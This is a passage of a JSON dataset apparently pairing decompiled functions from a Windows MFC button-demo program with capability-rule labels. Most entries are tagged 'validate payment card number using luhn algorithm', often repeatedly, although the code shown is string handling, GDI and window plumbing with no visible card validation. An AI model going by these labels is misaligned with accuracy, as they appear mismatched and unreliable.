        "decompiled_code": "\nulong fcn.1400021c0(int64_t *arg1, ulong hModule, ulong arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t arg2;\n    ushort *puVar3;\n    ulong uVar4;\n    \n    arg2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(hModule, (arg3 >> 4) + 1);\n    if (arg2 != 0) {\n        puVar3 = fcn.140001030(hModule, arg2, arg3);\n        if (puVar3 != NULL) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(3, 0, puVar3 + 1, *puVar3, 0, 0, 0, 0);\n            if ((1U - *(*arg1 + -8) | *(*arg1 + -0xc) - uVar2) < 0) {\n                fcn.1400020a0(arg1, uVar2);\n            }\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(3, 0, puVar3 + 1, *puVar3, *arg1, uVar2, 0, 0);\n            if ((-1 < uVar2) && (uVar2 <= *(*arg1 + -0xc))) {\n                *(*arg1 + -0x10) = uVar2;\n                *(uVar2 + *arg1) = 0;\n                return 1;\n            }\n            fcn.140001010(0x80070057);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 389
    },
    "1400022f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400022f0(int64_t *arg1, int64_t arg2, ulong arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t arg1_00;\n    code *pcVar6;\n    int64_t iVar7;\n    \n    iVar7 = arg3;\n    if (arg3 == 0) {\n        iVar7 = *arg1;\n        piVar4 = *(iVar7 + -0x18);\n        if (*(iVar7 + -0x10) != 0) {\n            if (*(iVar7 + -8) < 0) {\n                if (*(iVar7 + -0xc) < 0) {\n                    fcn.140001010(0x80070057);\n                    pcVar6 = swi(3);\n                    (*pcVar6)();\n                    return;\n                }\n                *(iVar7 + -0x10) = 0;\n                **arg1 = 0;\n                return;\n            }\n            LOCK();\n            piVar1 = iVar7 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar2 + -1 < 1) {\n                (**(**(iVar7 + -0x18) + 8))();\n            }\n            iVar7 = (**(*piVar4 + 0x18))(piVar4);\n            *arg1 = iVar7 + 0x18;\n        }\n        return;\n    }\n    if (arg2 == 0) {\n        fcn.140001010(0x80070057);\n        pcVar6 = swi(3);\n        (*pcVar6)();\n        return;\n    }\n    iVar5 = *arg1;\n    uVar3 = *(iVar5 + -0x10);\n    if ((1U - *(iVar5 + -8) | *(iVar5 + -0xc) - arg3) < 0) {\n        fcn.1400020a0(arg1, arg3);\n    }\n    arg1_00 = *arg1;\n    if (uVar3 < arg2 - iVar5) {\n        fcn.14001af18(arg1_00, *(arg1_00 + -0xc), arg2, iVar7);\n    }\n    else {\n        fcn.14001afb0(arg1_00, *(arg1_00 + -0xc), arg1_00 + (arg2 - iVar5), iVar7);\n    }\n    if ((-1 < arg3) && (arg3 <= *(*arg1 + -0xc))) {\n        *(*arg1 + -0x10) = arg3;\n        *(*arg1 + iVar7) = 0;\n        return;\n    }\n    fcn.140001010(0x80070057);\n    pcVar6 = swi(3);\n    (*pcVar6)();\n    return;\n}\n",
        "token_count": 647
    },
    "1400023d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400023d0(int64_t *arg1, int64_t arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    \n    if (arg2 == 0) {\n        fcn.140001010(0x80070057);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar2 = fcn.14001b070(arg2, arg3);\n    if ((1U - *(*arg1 + -8) | *(*arg1 + -0xc) - uVar2) < 0) {\n        fcn.1400020a0(arg1, uVar2);\n    }\n    fcn.14001b1f4(*arg1, uVar2 + 1, arg2, arg3);\n    if ((-1 < uVar2) && (uVar2 <= *(*arg1 + -0xc))) {\n        *(*arg1 + -0x10) = uVar2;\n        *(uVar2 + *arg1) = 0;\n        return;\n    }\n    fcn.140001010(0x80070057);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 277
    },
    "14000273": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140002730(code **arg1)\n\n{\n    uchar auStack616 [64];\n    ulong uStack552;\n    uint64_t uStack24;\n    \n    uStack552 = 0xfffffffffffffffe;\n    uStack24 = *0x14003e1a0 ^ auStack616;\n    *arg1 = vtable.CGdiObject.0;\n    fcn.140007850(arg1);\n    fcn.14001b410(uStack24 ^ auStack616);\n    return;\n}\n",
        "token_count": 110
    },
    "14000f88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000f880(int64_t arg1)\n\n{\n    if (*(arg1 + 0x20) != 0) {\n        (**(*(arg1 + 0x20) + 0x38))();\n    }\n    *(arg1 + 0x38) = 0;\n    return;\n}\n",
        "token_count": 70
    },
    "14000282": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.140002820(code **arg1)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    code **ppcVar3;\n    int64_t iVar4;\n    \n    fcn.140009874(arg1);\n    arg1[0x15] = vtable.CBitmap.0;\n    arg1[0x16] = NULL;\n    arg1[0x18] = NULL;\n    arg1[0x17] = vtable.CBitmap.0;\n    arg1[0x1a] = NULL;\n    arg1[0x19] = vtable.CBitmap.0;\n    arg1[0x1c] = NULL;\n    arg1[0x1b] = vtable.CBitmap.0;\n    *arg1 = vtable.CHoverButtonEx.0;\n    arg1[0x20] = NULL;\n    arg1[0x1f] = vtable.CBitmap.0;\n    arg1[0x26] = NULL;\n    arg1[0x25] = vtable.CRgn.0;\n    piVar2 = fcn.14000fd70();\n    if (piVar2 == NULL) {\n        fcn.140001010(0x80004005);\n        pcVar1 = swi(3);\n        ppcVar3 = (*pcVar1)();\n        return ppcVar3;\n    }\n    iVar4 = (**(*piVar2 + 0x18))(piVar2);\n    arg1[0x2b] = iVar4 + 0x18;\n    *(arg1 + 0x1d) = 0;\n    *(arg1 + 0x23) = 0;\n    *(arg1 + 0x11c) = 0;\n    arg1[0x22] = NULL;\n    arg1[0x2c] = NULL;\n    *(arg1 + 0xec) = 0;\n    *(arg1 + 0x1e) = 0;\n    *(arg1 + 0x24) = 0;\n    arg1[0x28] = NULL;\n    *(arg1 + 0x27) = 0;\n    *(arg1 + 0x124) = 0;\n    arg1[0x29] = NULL;\n    *(arg1 + 0x2a) = 0;\n    *(arg1 + 0x154) = 0;\n    return arg1;\n}\n",
        "token_count": 535
    },
    "140002d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.140002d00(code **arg1)\n\n{\n    fcn.1400123c8(arg1, 0);\n    *arg1 = vtable.CTransparentButtonDemoApp.0;\n    return arg1;\n}\n",
        "token_count": 52
    },
    "1400034d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400034d0(void)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    uint64_t uVar3;\n    \n    iVar1 = (*_sym.imp.ole32.dll_CoTaskMemAlloc)(100000000);\n    if (iVar1 == 0) {\n        return 3;\n    }\n    uVar3 = 0;\n    do {\n        *(uVar3 + iVar1) = uVar3;\n        uVar3 = uVar3 + 1;\n    } while (uVar3 < 100000000);\n    (*_sym.imp.ole32.dll_CoTaskMemFree)(iVar1);\n    uVar2 = 3;\n    if (uVar3 == 100000000) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 180
    },
    "14000474": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\nuint32_t fcn.140004740(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = arg2 >> 0x18;\n    iVar1 = 0xff - uVar2;\n    return (((arg1 & 0xffff00ff) * iVar1 + (arg2 & 0xffff00ff) * uVar2 ^\n            (arg2 & 0xff00) * uVar2 + (arg1 & 0xff00) * iVar1) & 0xff0000 ^\n           (arg1 & 0xff00ff) * iVar1 + (arg2 & 0xff00ff) * uVar2) >> 8 | arg2 & 0xff000000;\n}\n",
        "token_count": 171
    },
    "14000490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140004900(ulong *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t in_stack_00000028;\n    int16_t in_stack_00000030;\n    \n    arg1[6] = arg2;\n    *(arg1 + 0x44) = arg4;\n    *(arg1 + 9) = -in_stack_00000028;\n    arg1[7] = arg3;\n    if (in_stack_00000030 != 0) {\n        (***arg1)();\n        return arg1[6];\n    }\n    return arg1[6];\n}\n",
        "token_count": 138
    },
    "1400056a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.1400056a0(code **arg1, code *arg2)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    \n    *arg1 = vtable.winDIB.0;\n    arg1[5] = arg2;\n    arg1[6] = NULL;\n    arg1[7] = NULL;\n    *(arg1 + 8) = 0x28;\n    *(arg1 + 0x4c) = 1;\n    *(arg1 + 0x4e) = 0;\n    *(arg1 + 0xb) = 0x48;\n    *(arg1 + 0x5c) = 0x48;\n    *(arg1 + 0xc) = 0;\n    *(arg1 + 100) = 0;\n    if (*0x14003fe00 == '\\0') {\n        puVar1 = 0x14003fe10;\n        uVar4 = 0;\n        do {\n            iVar5 = 0x100;\n            puVar2 = puVar1;\n            uVar3 = 0;\n            do {\n                puVar1 = puVar2 + 1;\n                iVar5 = iVar5 + -1;\n                *puVar2 = uVar3 >> 8;\n                puVar2 = puVar1;\n                uVar3 = uVar3 + uVar4;\n            } while (iVar5 != 0);\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 0x100);\n        *0x14003fe00 = '\\x01';\n    }\n    return arg1;\n}\n",
        "token_count": 382
    },
    "14000587": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140005870(ulong arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    \n    while( true ) {\n        iVar2 = fcn.14001b99c(arg1);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        if (*0x14003d2c8 == NULL) break;\n        iVar1 = (**0x14003d2c8)(arg1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 127
    },
    "1400058c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400058c4(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t arg1_00;\n    code *pcVar1;\n    int64_t arg2_00;\n    uint32_t uVar2;\n    int32_t in_stack_00000028;\n    \n    arg2_00 = arg3;\n    uVar2 = arg3 + in_stack_00000028;\n    if ((1U - *(*arg1 + -8) | *(*arg1 + -0xc) - uVar2) < 0) {\n        fcn.1400020a0(arg1, uVar2);\n    }\n    arg1_00 = *arg1;\n    fcn.14001af18(arg1_00, arg2_00, arg2, arg2_00);\n    fcn.14001af18(arg2_00 + arg1_00, in_stack_00000028, arg4, in_stack_00000028);\n    if ((-1 < uVar2) && (uVar2 <= *(*arg1 + -0xc))) {\n        *(*arg1 + -0x10) = uVar2;\n        *(uVar2 + *arg1) = 0;\n        return;\n    }\n    fcn.140001010(0x80070057);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 313
    },
    "140005b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140005b7c(int64_t *arg1)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    uchar in_DL;\n    uint32_t uVar4;\n    \n    iVar2 = *arg1;\n    uVar1 = *(iVar2 + -0x10);\n    uVar4 = uVar1 + 1;\n    if ((1U - *(iVar2 + -8) | *(iVar2 + -0xc) - uVar4) < 0) {\n        fcn.1400020a0(arg1, uVar4);\n    }\n    *(uVar1 + *arg1) = in_DL;\n    if ((-1 < uVar4) && (uVar4 <= *(*arg1 + -0xc))) {\n        *(*arg1 + -0x10) = uVar4;\n        *(uVar4 + *arg1) = 0;\n        return;\n    }\n    fcn.140001010(0x80070057);\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 245
    },
    "1400157d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400157d4(uint32_t *arg1)\n\n{\n    if ((*arg1 != 0) && (*0x140053400 != 0)) {\n        fcn.140015350(*0x140053400, *arg1);\n    }\n    *arg1 = 0;\n    return;\n}\n",
        "token_count": 71
    },
    "1400061a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400061a4(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    \n    LOCK();\n    piVar1 = arg1 + 0x30;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        if (*(arg1 + 0x28) != NULL) {\n            (**(**(arg1 + 0x28) + 0x10))();\n            *(arg1 + 0x28) = 0;\n        }\n        if (*(arg1 + 0x10) != NULL) {\n            (**(**(arg1 + 0x10) + 0x10))();\n            *(arg1 + 0x10) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "14000621": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000621c(code **arg1)\n\n{\n    *arg1 = vtable._AFX_THREAD_STATE.0;\n    if (arg1[10] != NULL) {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)();\n    }\n    if (arg1[9] != NULL) {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)();\n    }\n    if (arg1[3] != NULL) {\n        fcn.14001ba54(arg1[3]);\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "14000641": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140006414(void)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.140015718(0x14004fe50, 0x140005e54);\n    if (iVar2 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "140006c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140006c48(void)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.140015718(0x14004fe50, 0x140005e54);\n    if (iVar2 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (*(iVar2 + 8) == 0) {\n        iVar2 = fcn.14001503c(0x14004fe48, 0x140006bfc);\n        if (iVar2 == 0) {\n            fcn.140005e30();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 180
    },
    "140006c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140006c98(void)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.140006c48();\n    iVar2 = fcn.140015718(iVar2 + 0xc0, 0x1400063b8);\n    if (iVar2 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "1400072e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400072ec(int64_t hWnd, uint *arg2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    (*_sym.imp.USER32.dll_ScreenToClient)(*(hWnd + 0x40));\n    (*_sym.imp.USER32.dll_ScreenToClient)(*(hWnd + 0x40), arg2 + 2);\n    uVar2 = fcn.140007b68(hWnd);\n    if ((uVar2 >> 0x16 & 1) != 0) {\n        uVar1 = *arg2;\n        *arg2 = arg2[2];\n        arg2[2] = uVar1;\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "14000734": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140007344(int64_t hWnd, uint *arg2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    (*_sym.imp.USER32.dll_ClientToScreen)(*(hWnd + 0x40));\n    (*_sym.imp.USER32.dll_ClientToScreen)(*(hWnd + 0x40), arg2 + 2);\n    uVar2 = fcn.140007b68(hWnd);\n    if ((uVar2 >> 0x16 & 1) != 0) {\n        uVar1 = *arg2;\n        *arg2 = arg2[2];\n        arg2[2] = uVar1;\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "1400074d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400074d8(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong arg1_00;\n    int64_t iVar3;\n    int64_t *piVar4;\n    \n    iVar1 = fcn.140007434(1);\n    if (arg1 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.140015944(iVar1 + 0x30, arg1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.140015944(iVar1 + 0x68, arg1);\n            if (iVar2 == 0) {\n                arg1_00 = fcn.140005860(0x140016664);\n                iVar2 = fcn.140018d74(iVar1 + 8);\n                iVar3 = iVar2;\n                if (iVar2 == 0) {\n                    iVar3 = fcn.140005de8();\n                }\n                (**(iVar1 + 0x20))(iVar3);\n                piVar4 = fcn.140015b8c(iVar1 + 0x68, arg1);\n                *piVar4 = iVar2;\n                fcn.140005860(arg1_00);\n                iVar3 = *(iVar1 + 0xa8);\n                *(iVar2 + iVar3) = arg1;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar2 + 8 + iVar3) = arg1;\n                }\n            }\n            else {\n                iVar3 = *(iVar1 + 0xa8);\n                *(iVar2 + iVar3) = arg1;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar2 + 8 + iVar3) = arg1;\n                }\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 417
    },
    "1400074f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.1400074fc(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t **ppiVar2;\n    \n    if (arg2 != 0) {\n        arg1[1] = arg2;\n        iVar1 = fcn.140007434(1);\n        ppiVar2 = fcn.140015b8c(iVar1 + 0x30, arg1[1]);\n        *ppiVar2 = arg1;\n        (**(*arg1 + 0x18))(arg1, arg1[1]);\n    }\n    return arg2 != 0;\n}\n",
        "token_count": 140
    },
    "1400077a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400077ac(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong arg1_00;\n    int64_t iVar3;\n    int64_t *piVar4;\n    \n    iVar1 = fcn.140007708(1);\n    if (arg1 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.140015944(iVar1 + 0x30, arg1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.140015944(iVar1 + 0x68, arg1);\n            if (iVar2 == 0) {\n                arg1_00 = fcn.140005860(0x140016664);\n                iVar2 = fcn.140018d74(iVar1 + 8);\n                iVar3 = iVar2;\n                if (iVar2 == 0) {\n                    iVar3 = fcn.140005de8();\n                }\n                (**(iVar1 + 0x20))(iVar3);\n                piVar4 = fcn.140015b8c(iVar1 + 0x68, arg1);\n                *piVar4 = iVar2;\n                fcn.140005860(arg1_00);\n                iVar3 = *(iVar1 + 0xa8);\n                *(iVar2 + iVar3) = arg1;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar2 + 8 + iVar3) = arg1;\n                }\n            }\n            else {\n                iVar3 = *(iVar1 + 0xa8);\n                *(iVar2 + iVar3) = arg1;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar2 + 8 + iVar3) = arg1;\n                }\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 416
    },
    "1400077d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.1400077d0(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    \n    if (arg2 != 0) {\n        *(arg1 + 8) = arg2;\n        iVar1 = fcn.140007708(1);\n        piVar2 = fcn.140015b8c(iVar1 + 0x30, *(arg1 + 8));\n        *piVar2 = arg1;\n    }\n    return arg2 != 0;\n}\n",
        "token_count": 124
    },
    "1400078a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400078a4(ulong hdc, ulong hgdiobj)\n\n{\n    int64_t iVar1;\n    int64_t arg2;\n    int64_t iVar2;\n    ulong arg1;\n    int64_t iVar3;\n    int64_t *piVar4;\n    \n    arg2 = (*_sym.imp.GDI32.dll_SelectObject)();\n    iVar1 = fcn.140007708(1);\n    if (arg2 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.140015944(iVar1 + 0x30, arg2);\n        if (iVar2 == 0) {\n            iVar2 = fcn.140015944(iVar1 + 0x68, arg2);\n            if (iVar2 == 0) {\n                arg1 = fcn.140005860(0x140016664);\n                iVar2 = fcn.140018d74(iVar1 + 8);\n                iVar3 = iVar2;\n                if (iVar2 == 0) {\n                    iVar3 = fcn.140005de8();\n                }\n                (**(iVar1 + 0x20))(iVar3);\n                piVar4 = fcn.140015b8c(iVar1 + 0x68, arg2);\n                *piVar4 = iVar2;\n                fcn.140005860(arg1);\n                iVar3 = *(iVar1 + 0xa8);\n                *(iVar2 + iVar3) = arg2;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar2 + 8 + iVar3) = arg2;\n                }\n            }\n            else {\n                iVar3 = *(iVar1 + 0xa8);\n                *(iVar2 + iVar3) = arg2;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar2 + 8 + iVar3) = arg2;\n                }\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 436
    },
    "140007af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140007af0(int64_t hDlg, ulong arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*(hDlg + 0x78) >> 8 & 1) == 0) {\n        (*_sym.imp.USER32.dll_IsDialogMessageA)(*(hDlg + 0x40));\n    }\n    else {\n        iVar1 = fcn.140006c48();\n        (**(**(iVar1 + 0x68) + 0x50))(*(iVar1 + 0x68), hDlg, arg2);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "14000802": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140008020(ulong arg1, uint64_t arg2)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uchar auStack28 [20];\n    \n    iVar1 = fcn.140007e50();\n    if (iVar1 == 0) {\n        if ((arg2 & 3) == 0) {\n            iVar1 = (*_sym.imp.USER32.dll_IsIconic)(arg1);\n            if (iVar1 == 0) {\n                iVar1 = (*_sym.imp.USER32.dll_GetWindowRect)(arg1);\n            }\n            else {\n                iVar1 = (*_sym.imp.USER32.dll_GetWindowPlacement)();\n            }\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = fcn.140007fb4(auStack28, arg2 & 0xffffffff);\n            }\n        }\n        else {\n            uVar2 = 0x12340042;\n        }\n    }\n    else {\n        uVar2 = (**0x140052fb8)(arg1, arg2 & 0xffffffff);\n    }\n    return uVar2;\n}\n",
        "token_count": 251
    },
    "140008a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140008a6c(ulong noname_0, ulong *arg2, ulong arg3)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    ulong *puVar5;\n    int64_t iVar6;\n    uint *in_stack_00000028;\n    \n    uVar3 = 0;\n    if (arg3 != 0) {\n        do {\n            bVar1 = false;\n            puVar4 = 0x14003d9d0;\n            puVar5 = 0x14003d930;\n            iVar6 = 0x13;\n            do {\n                iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(*arg2, *puVar5);\n                if (iVar2 == 0) {\n                    bVar1 = true;\n                    *in_stack_00000028 = *puVar4;\n                }\n                puVar5 = puVar5 + 1;\n                puVar4 = puVar4 + 1;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n            if (!bVar1) {\n                return 0x80020006;\n            }\n            uVar3 = uVar3 + 1;\n            arg2 = arg2 + 1;\n            in_stack_00000028 = in_stack_00000028 + 1;\n        } while (uVar3 < arg3);\n    }\n    return 0;\n}\n",
        "token_count": 327
    },
    "140008c1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140008c1c(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.140008b90(noname_0, 0xffffffec, arg2, arg3);\n    return;\n}\n",
        "token_count": 58
    },
    "140016df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
